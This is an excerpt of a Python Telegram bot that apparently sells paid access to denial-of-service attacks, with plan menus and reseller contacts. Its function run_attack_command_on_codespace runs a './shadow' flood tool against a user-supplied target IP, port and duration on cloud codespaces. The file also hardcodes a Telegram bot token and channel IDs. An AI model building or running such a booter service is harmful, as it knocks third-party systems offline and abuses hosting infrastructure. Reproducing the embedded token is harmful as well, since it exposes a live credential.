...
TOKEN = '7470021130:AAGu76xnACyGUJiQrrTm5VuAqcfFe5jmVaY'
...
CHANNEL_ID = -1002431196846
error_channel_id = -1002431196846
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./shadow {target_ip} {target_port} {duration} 50"
    try:
...
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACESS:-@LASTWISHES*", parse_mode='Markdown')
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*FOR RESSELER SHIP DM :-@LASTWISHES*", parse_mode='Markdown')
...
if __name__ == "__main__":
    ...
    logging.info("PREMIUM SERVER RUNNING.....")
    while True:
        try:
